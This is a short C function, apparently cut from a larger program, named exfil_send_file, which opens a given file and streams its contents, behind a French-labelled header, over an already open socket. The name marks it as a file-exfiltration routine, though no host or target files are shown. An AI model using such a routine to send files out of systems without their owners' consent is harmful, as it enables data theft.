static int exfil_send_file(int sock, const char *filepath) {
    FILE *f = fopen(filepath, "r");
    if (!f) return -1;

    char header[MAX_LINE];
    snprintf(header, sizeof header, "\n=== FICHIER: %s ===\n", filepath);
    send(sock, header, strlen(header), 0);

    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof buf, f)) > 0) {
        send(sock, buf, n, 0);
    }
    fclose(f);
    return 0;
}

